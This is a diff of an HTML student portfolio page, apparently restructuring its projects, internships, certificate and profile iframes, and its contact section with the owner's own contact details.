-            <h1 class="text-center"style="font-size: 20px"><b>PROJECTS</b></h1>
-            <div class="row">
-                
-				
-		        <div class="col-lg-4 mt-4">
-                    <div class="card">
-                        <img class="card-img-top" src="images/security.jpg" alt="Card image" style="width:100%">
-                        <div class="card-body">
-                            <h4 class="card-title"><b>SMART ALERT SYSTEM</b></h4>
-                            <p class="card-text" style="font-size:13px"><b>- C#, MYSQL, MICROSOFT VISUAL STUDIO</b><br> Providing additional security to computer by sending victim photo to admin gmail and phone </p>
-                            <div class="text-center">
-                                <a href="https://github.com/arunkumarselvaraj-github/SMART-ALERT-SYSTEM" target="_blank" class="btn btn-success"style="background-color: #red; border-color: #red; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
-								                                <a href="https://drive.google.com/file/d/1N5UNYpTYzAlvaClwVTrB4p6Eqe9hqyJ8/view" target="_blank" class="btn btn-success"style="background-color: #brown; border-color: #Orange; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-4 mt-4">
-                    <div class="card">
-                        <img class="card-img-top" src="images/nutro1.jpg" alt="Card image" style="width:100%">
-                        <div class="card-body">
-                            <h4 class="card-title"><b>NUTRO ASSISTANT - IBM</b></h4>
-                            <p class="card-text" style="font-size:13px"><b>- HTML, CSS, JAVASCRIPT, MYSQL, ANGULAR JS</b><br> Health assistant platform to know about daily habits </p>
-                            <div class="text-center">
-                                <a href="https://github.com/arunkumarselvaraj-github/NUTRO-ASSISTANT" target="_blank" class="btn btn-success"style="background-color: #ffa500; border-color: #Orange; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
-								                                <a href="https://drive.google.com/file/d/12ejTxQ14_3z8Mu_IYnk6Pea299slXRzt/view" target="_blank" class="btn btn-success"style="background-color: #ffa500; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
-                            
-							                    <a href="https://nutro-check-assistant.web.app/" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>LIVE WEB</b></a>
-							</div>
-                        </div>
-                    </div>
-                </div>
-				
-				        
-
-                
-				                <div class="col-lg-4 mt-4">
-                    <div class="card">
-                        <img class="card-img-top" src="images/image111.jpg" alt="Card image" style="width:100%">
-                        <div class="card-body">
-                            <h4 class="card-title"><b>AI-POWERED NUTRITION ANALYZER FOR FITNESS ENTHUSIASTIC</b></h4>
-                            <p class="card-text" style="font-size:13px"><b>- NEURAL NETWORK, NLP, PYTHON-FLASK FRAMEWORK</b><br> Image analysis to detect nutrition attributes like sugar, fiber, protein, and calories.</p>
-                            <div class="text-center">
-                                <a href="https://github.com/arunkumarselvaraj-github/NUTRITION-ANALYZER" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
-								                                <a href="https://drive.google.com/file/d/1X-hlrlsknFRl7jbytpF_sBD1yL0nQLSf/view?usp=sharing" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                         <div class="col-lg-4 mt-4">
-                    <div class="card">
-                        <img class="card-img-top" src="images/image112.jpg" alt="Card image" style="width:100%">
-                        <div class="card-body">
-                            <h4 class="card-title" ><b> A NOVEL APPROACH TO CLASSIFY MULTI LABEL IMAGES USING TRANSFER LERANING TECHNIQUES</b></h4>
-                            <p class="card-text" style="font-size:13px"><b>- NEURAL NETWORK, NLP, PYTHON-FLASK FRAMEWORK</b><br> Multi Label image analysis using ResNet50, InceptionV3, CNN, VGG16, VGG19. </p>
-                            <div class="text-center">
-                                <a href="https://github.com/arunkumarselvaraj-github/FINAL_YEAR-PROJECT" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
-								                                <a href="https://drive.google.com/file/d/1tNS-xPKYOSrRRshKk2D7nBr-yGtsJQf0/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #0dce33; border-color: #2807a0; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="url.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">STORAGE URL SUBMISSION</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="link.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">WEBPAGE MANAGEMENT SYSTEM</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="calculators.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">CALCULATION MANAGEMENT SYSTEM</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="birthday.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">BIRTHDAY MANAGEMENT SYSTEM</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="travel.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">TRAVEL MANAGEMENT SYSTEM</a>
+      </div>
+      <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+          <a href="medicine.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">MEDICINE MANAGEMENT SYSTEM</a>
+      </div>
+     <div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+      <a href="receipe.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">RECEIPE FINDER SYSTEM</a>
+  </div>
+<div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+   <a href="photodetails.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">TECH INFORMATION SYSTEM</a>
+</div>
+<div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+   <a href="movies.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">MOVIES ANALYSIS SYSTEM</a>
+</div>
+<div style="flex: 0 0 calc(20% - 20px); background-color: #ffffff; border: 1px solid #2308f2; padding: 20px; border-radius: 8px; text-align: center; box-sizing: border-box; margin-bottom: 20px;">
+   <a href="translate.html" target="_blank" style="text-decoration: none; color: #333; font-weight: bold; display: block; margin-top: 10px;">TRANSLATE SYSTEM</a>
+</div>
 
 
-
+  </div>
             </div>
-    </section>
-	
-	 <section id="internship">
-        <div class="container">
-		<br><br><br>
-        <h1 class="text-center"style="font-size: 20px"><b>INTERNSHIP</b></h1>
-            <div class="row">
-                <div class="row">
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>HR Talent Acquisition</b></h4>
-                                <p class="card-text mt-3">Crazy for Success Foundation<br><span class="date">(18/01/2021 - 31/01/2021)</span></p>
-                                <p class="card-description">Non-profit educational organization that teaches personal development and leadership skills.</p>
-                                <a href="https://drive.google.com/file/d/1n9u6rQAC-4QSMC5eymF6llxgtBj6wbro/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #0d498a; border-color: #8db50c; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
-                                <a href="https://drive.google.com/file/d/166-aQ-bvxEEkHFomTp06Vm_ZCVQK_6zT/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #e5750c; border-color: #998a05; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                        </div>
-                        </div>
-                    </div>
-                    
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>Entrepreneurship Program</b></h4>
-                                <p class="card-text mt-3">IIT E Cell Bombay<br><span class="date">(01/07/2021 - 30/09/2021)</span></p>
-                                <p class="card-description">Non-profit organization that aims to manifest the latent entrepreneurial spirit of young students. Promotes students by engaging them with different activities.</p>
-                                <a href="https://drive.google.com/file/d/1kyU0jSs_g4ujF9GMFi0rffzUq5gIayqc/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #984a05; border-color: #1d023a; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
-                                <a href="https://drive.google.com/file/d/1nWvdpeXCVl6M8An3C38tooclz4ftOw3q/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #d56528; border-color: #5a11e1; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                        </div>
-                        </div>
-                    </div>
-                    
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>Python for ML/AI Internship</b></h4>
-                                <p class="card-text mt-3">Skill India Scholarship Foundation<br><span class="date">(15/07/2021 - 15/08/2021)</span></p>
-                                <p class="card-description">Ability to learn without being explicitly programmed. Focus on the development of Computer Programs.</p>
-                                <a href="https://drive.google.com/file/d/1sA6kb-suPI-px7Kjn-rv4q9Brw-UoeV8/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #10e50c; border-color: #1811e1; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>Full Stack Development</b></h4>
-                                <p class="card-text mt-3">Smartinternz<br><span class="date">(29/11/2021 - 29/01/2022)</span></p>
-                                <p class="card-description">Health assistant platform to know about daily habits. Wellness and healthy lifestyles have become mainstream.</p>
-                                <a href="https://drive.google.com/file/d/1hWKoruz1nzm1rzq80vtH2US8YVjF6LWt/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #b192af; border-color: #196e2b; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>Campus Ambassador</b></h4>
-                                <p class="card-text mt-3">Lyriclious<br><span class="date">(16/12/2021 - 16/01/2022)</span></p>
-                                <p class="card-description">Online learning platform providing training, internships, and courses along with projects in many professional and technical courses.</p>
-                                <a href="https://drive.google.com/file/d/1dAKaT4vDrfwCDxkF8Uz5wanAlLa59PTn/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #b124a8; border-color: #040514; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
-                                <a href="https://drive.google.com/file/d/1LVzppJKBRh2liwjfbb5RVUCWt7hteiB5/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #754017; border-color: #443ea0; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                        </div>
-                        </div>
-                    </div>
-                    
-                    <div class="col-lg-4 mt-4">
-                        <div class="card servicesText">
-                            <div class="card-body">
-                                <h4 class="card-title mt-3"><b>Salesforce Developer</b></h4>
-                                <p class="card-text mt-3">SpringFive<br><span class="date">(09/01/2023 - 30/04/2023)</span></p>
-                                <p class="card-description">Online learning platform - Trialhead providing training, modules, and courses along with projects to get trained in Salesforce.</p>
-                                <a href="https://drive.google.com/file/d/1KEWMqAe59OaqmyO_r8-7dFcsxjIOc907/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #2b9b66; border-color: #7b3d10; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
-                                <a href="https://drive.google.com/file/d/1q_eFD1gF-A9AQiM12szjydbBpN3HBFGP/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #785cb4; border-color: #111cb5; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
-                        </div>
-                            </div>
-                            
-                            </div>
-                    
-
-               
+         </div></div>
+      </section>
+      <section id="projects">
+         <div class="container mt-3">
+         <br><br><br>
+         <h1 class="text-center"style="font-size: 20px"><b>PROJECTS</b></h1>
+         <div class="row">
+            <div class="col-lg-4 mt-4">
+               <div class="card">
+                  <img class="card-img-top" src="images/security.jpg" alt="Card image" style="width:100%">
+                  <div class="card-body">
+                     <h4 class="card-title"><b>SMART ALERT SYSTEM</b></h4>
+                     <p class="card-text" style="font-size:13px"><b>- C#, MYSQL, MICROSOFT VISUAL STUDIO</b><br> Providing additional security to computer by sending victim photo to admin gmail and phone </p>
+                     <div class="text-center">
+                        <a href="https://github.com/arunkumarselvaraj-github/SMART-ALERT-SYSTEM" target="_blank" class="btn btn-success"style="background-color: #red; border-color: #red; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
+                        <a href="https://drive.google.com/file/d/1tc6yEzSEY3I0jQlO3za1SsQhkp2Sh4yp/view?usp=sharing" target="_blank" class="btn btn-success"style="background-color: #brown; border-color: #Orange; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
+                     </div>
+                  </div>
+               </div>
             </div>
-        </div>
-    </section>
-	
-    <section id="certificate">
-        <br><br><br>
-        <h1 class="text-center" style="font-size: 20px"><b>CERTIFICATE</b></h1><br>
-    
-        <div class="container" style="display: flex; justify-content: center; align-items: center;">
-            <!-- You can trigger the preview loading automatically -->
-        </div><br>
-    
-        <iframe id="previewFrame" width="100%" height="500px"></iframe>
-    </section>
-    <section id="profile">
-        <br><br><br>
-        <h1 class="text-center" style="font-size: 20px"><b>PROFILE</b></h1><br>
-    
-        <div class="container" style="display: flex; justify-content: center; align-items: center;">
-            <!-- You can trigger the preview loading automatically -->
-        </div><br>
-    
-        <iframe id="previewFrame1" width="100%" height="500px"></iframe>
-    </section>
-    <script>
-        // Call the functions when the page loads
-        window.onload = function() {
-            openPreview(); // Load certificate content
-            openPreview1(); // Load profile content
-        };
-        
-        function openPreview1() {
-            document.getElementById('previewFrame1').src = 'profile/index.html';
-        }
-    
-        function openPreview() {
-            document.getElementById('previewFrame').src = 'certificate/index.html';
-        }
-    </script>
-
-    
-    <section id="contact">
-        <div class="contact container">
+            <div class="col-lg-4 mt-4">
+               <div class="card">
+                  <img class="card-img-top" src="images/nutro1.jpg" alt="Card image" style="width:100%">
+                  <div class="card-body">
+                     <h4 class="card-title"><b>NUTRO ASSISTANT - IBM</b></h4>
+                     <p class="card-text" style="font-size:13px"><b>- HTML, CSS, JAVASCRIPT, MYSQL, ANGULAR JS</b><br> Health assistant platform to know about daily habits </p>
+                     <div class="text-center">
+                        <a href="https://github.com/arunkumarselvaraj-github/NUTRO-ASSISTANT" target="_blank" class="btn btn-success"style="background-color: #ffa500; border-color: #Orange; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
+                        <a href="https://drive.google.com/file/d/1dUNKAEggyfv0U39V4Oh4iY9StF8FvRxq/view?usp=sharing" target="_blank" class="btn btn-success"style="background-color: #ffa500; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
+                        <a href="https://nutro-check-assistant.web.app/" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>LIVE WEB</b></a>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="col-lg-4 mt-4">
+               <div class="card">
+                  <img class="card-img-top" src="images/image111.jpg" alt="Card image" style="width:100%">
+                  <div class="card-body">
+                     <h4 class="card-title"><b>AI-POWERED NUTRITION ANALYZER FOR FITNESS ENTHUSIASTIC</b></h4>
+                     <p class="card-text" style="font-size:13px"><b>- NEURAL NETWORK, NLP, PYTHON-FLASK FRAMEWORK</b><br> Image analysis to detect nutrition attributes like sugar, fiber, protein, and calories.</p>
+                     <div class="text-center">
+                        <a href="https://github.com/arunkumarselvaraj-github/NUTRITION-ANALYZER" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
+                        <a href="https://drive.google.com/file/d/1jyIycJ-6COCwhOiQ4-Wq68plagADYyV9/view?usp=sharing" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="col-lg-4 mt-4">
+               <div class="card">
+                  <img class="card-img-top" src="images/image112.jpg" alt="Card image" style="width:100%">
+                  <div class="card-body">
+                     <h4 class="card-title" ><b> A NOVEL APPROACH TO CLASSIFY MULTI LABEL IMAGES USING TRANSFER LERANING TECHNIQUES</b></h4>
+                     <p class="card-text" style="font-size:13px"><b>- NEURAL NETWORK, NLP, PYTHON-FLASK FRAMEWORK</b><br> Multi Label image analysis using ResNet50, InceptionV3, CNN, VGG16, VGG19. </p>
+                     <div class="text-center">
+                        <a href="https://github.com/arunkumarselvaraj-github/FINAL_YEAR-PROJECT" target="_blank" class="btn btn-success"style="background-color: #00FF00; border-color: #DodgerBlue; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>GITHUB</b></a>
+                        <a href="https://drive.google.com/file/d/17-Y2lHI56l8eU42UjwKA3INdKcgjdiax/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #0dce33; border-color: #2807a0; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>DEMO VIDEO</b></a>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <section id="internship">
+         <div class="container">
+         <br><br><br>
+         <h1 class="text-center"style="font-size: 20px"><b>INTERNSHIP</b></h1>
+         <div class="row">
+            <div class="row">
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>HR Talent Acquisition</b></h4>
+                        <p class="card-text mt-3">Crazy for Success Foundation<br><span class="date">(18/01/2021 - 31/01/2021)</span></p>
+                        <p class="card-description">Non-profit educational organization that teaches personal development and leadership skills.</p>
+                        <a href="https://drive.google.com/file/d/1n9u6rQAC-4QSMC5eymF6llxgtBj6wbro/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #0d8a45; border-color: #8db50c; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
+                        <a href="https://drive.google.com/file/d/166-aQ-bvxEEkHFomTp06Vm_ZCVQK_6zT/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #e5750c; border-color: #998a05; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>Entrepreneurship Program</b></h4>
+                        <p class="card-text mt-3">IIT E Cell Bombay<br><span class="date">(01/07/2021 - 30/09/2021)</span></p>
+                        <p class="card-description">Non-profit organization that aims to manifest the latent entrepreneurial spirit of young students.</p>
+                        <a href="https://drive.google.com/file/d/1kyU0jSs_g4ujF9GMFi0rffzUq5gIayqc/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #c7e604; border-color: #1d023a; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
+                        <a href="https://drive.google.com/file/d/1nWvdpeXCVl6M8An3C38tooclz4ftOw3q/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #d56528; border-color: #5a11e1; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>Python for ML/AI Internship</b></h4>
+                        <p class="card-text mt-3">Skill India Scholarship Foundation<br><span class="date">(15/07/2021 - 15/08/2021)</span></p>
+                        <p class="card-description">Ability to learn without being explicitly programmed. Focus on the development of Computer Programs.</p>
+                        <a href="https://drive.google.com/file/d/1sA6kb-suPI-px7Kjn-rv4q9Brw-UoeV8/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #10e50c; border-color: #1811e1; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>Full Stack Development</b></h4>
+                        <p class="card-text mt-3">Smartinternz<br><span class="date">(29/11/2021 - 29/01/2022)</span></p>
+                        <p class="card-description">Health assistant platform to know about daily habits. Wellness and healthy lifestyles have become mainstream.</p>
+                        <a href="https://drive.google.com/file/d/1hWKoruz1nzm1rzq80vtH2US8YVjF6LWt/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #b192af; border-color: #196e2b; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>Campus Ambassador</b></h4>
+                        <p class="card-text mt-3">Lyriclious<br><span class="date">(16/12/2021 - 16/01/2022)</span></p>
+                        <p class="card-description">Online learning platform providing training, internships, and courses along with projects in many professional and technical courses.</p>
+                        <a href="https://drive.google.com/file/d/1dAKaT4vDrfwCDxkF8Uz5wanAlLa59PTn/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #b124a8; border-color: #040514; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
+                        <a href="https://drive.google.com/file/d/1LVzppJKBRh2liwjfbb5RVUCWt7hteiB5/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #d10d99; border-color: #443ea0; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+               <div class="col-lg-4 mt-4">
+                  <div class="card servicesText">
+                     <div class="card-body">
+                        <h4 class="card-title mt-3"><b>Salesforce Developer</b></h4>
+                        <p class="card-text mt-3">SpringFive<br><span class="date">(09/01/2023 - 30/04/2023)</span></p>
+                        <p class="card-description">Online learning platform - Trialhead providing training, modules, and courses along with projects to get trained in Salesforce.</p>
+                        <a href="https://drive.google.com/file/d/1KEWMqAe59OaqmyO_r8-7dFcsxjIOc907/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #2b9b66; border-color: #7b3d10; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>OFFER LETTER</b></a>
+                        <a href="https://drive.google.com/file/d/1q_eFD1gF-A9AQiM12szjydbBpN3HBFGP/view?usp=sharing" target="_blank" class="btn btn-success" style="background-color: #785cb4; border-color: #111cb5; font-size:10px; color: black; padding: 5px 15px; border-radius: 3px; text-decoration: none;"><b>CERTIFICATE</b></a>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </section>
+      <section id="certificate">
+         <br><br><br>
+         <h1 class="text-center" style="font-size: 20px"><b>CERTIFICATE</b></h1>
+         <br>
+         <div class="container" style="display: flex; justify-content: center; align-items: center;">
+         </div>
+         <br>
+         <iframe id="previewFrame" width="100%" height="1500px"></iframe>
+      </section>
+      <section id="profile">
+         <br><br><br>
+         <h1 class="text-center" style="font-size: 20px"><b>PROFILE</b></h1>
+         <br>
+         <div class="container" style="display: flex; justify-content: center; align-items: center;">
+         </div>
+         <br>
+         <iframe id="previewFrame1" width="100%" height="500px"></iframe>
+      </section>
+      <section id="contact">
+         <div class="contact container">
             <h1 class="text-center"style="font-size: 20px"><b>CONTACT INFO</b></h1>
-          <div class="contact-items">
-            <div class="contact-item">
-                <a href= "tel:9585769175" target="_blank" style="text-decoration: none;"><div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/phone.png" /></div>
-              <div class="contact-info">
-                <h1><b>Phone</b></h1>
-                <h2>+919585769175</h2></a>
-                <br>
-                <a href= "tel:9585769175" target="_blank" style="text-decoration: none;" style="text-decoration: none;"><b>CALL NOW</b></a>
-                
-              </div>
+            <div class="contact-items">
+               <div class="contact-item">
+                  <a href= "tel:9585769175" target="_blank" style="text-decoration: none;">
+                     <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/phone.png" /></div>
+                     <div class="contact-info">
+                        <h1><b>Phone</b></h1>
+                        <h2>+919585769175</h2>
+                  </a>
+                  <br>
+                  <a href= "tel:9585769175" target="_blank" style="text-decoration: none;" style="text-decoration: none;"><b>CALL NOW</b></a>
+                  </div>
+               </div>
+               <div class="contact-item">
+                  <a href= "https://wa.me//919585769175" target="_blank" style="text-decoration: none;">
+                     <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/whatsapp.png"></div>
+                     <div class="contact-info">
+                        <h1><b>Whatsapp</b></h1>
+                        <h2>+919585769175</h2>
+                  </a>
+                  <br>
+                  <a href= "https://wa.me//919585769175" target="_blank" style="text-decoration: none;"><b>CHAT NOW</b></a> 
+                  </div>
+               </div>
+               <div class="contact-item">
+                  <a href = "mailto:arunkumarhari22@gmail.com?subject = Feedback&body = Hi" target="_blank" style="text-decoration: none;">
+                     <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/new-post.png" /></div>
+                     <div class="contact-info">
+                        <h1><b>Email</b></h1>
+                        <h2>arunkumarhari22@gmail.com</h2>
+                  </a>
+                  <br>
+                  <a href = "mailto:arunkumarhari22@gmail.com?subject = Feedback&body = Hi" target="_blank" style="text-decoration: none;"><b>SEND GMAIL</b></a>
+                  </div>
+               </div>
+               <div class="contact-item">
+                  <a href= "https://maps.app.goo.gl/dYFvv4mCbDunqBbn6" target="_blank" style="text-decoration: none;">
+                     <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/map-marker.png" /></div>
+                     <div class="contact-info">
+                        <h1><b>Address</b></h1>
+                        <h2>65a/6, Vilvanur, Idayapatti post, Salem-636114, Tamil Nadu, India</h2>
+                  </a>
+                  <br>
+                  <a href= "https://maps.app.goo.gl/dYFvv4mCbDunqBbn6" target="_blank" style="text-decoration: none;"><b>GET IN MAP</b></a> 
+                  </div>
+               </div>
             </div>
-            <div class="contact-item">
-                <a href= "https://wa.me//919585769175" target="_blank" style="text-decoration: none;"><div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/whatsapp.png"></div>
-              <div class="contact-info">
-                            <h1><b>Whatsapp</b></h1>
-                                        <h2>+919585769175</h2></a>
-                            <br>
-                <a href= "https://wa.me//919585769175" target="_blank" style="text-decoration: none;"><b>CHAT NOW</b></a> 
-               
-              </div>
-                 
-              </div>
-            <div class="contact-item">
-                <a href = "mailto:arunkumarhari22@gmail.com?subject = Feedback&body = Hi" target="_blank" style="text-decoration: none;"><div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/new-post.png" /></div>
-              <div class="contact-info">
-                <h1><b>Email</b></h1>
-                <h2>arunkumarhari22@gmail.com</h2></a>
-                <br>
-    <a href = "mailto:arunkumarhari22@gmail.com?subject = Feedback&body = Hi" target="_blank" style="text-decoration: none;"><b>SEND GMAIL</b></a>
-    
-              </div>
-            </div>
-            <div class="contact-item">
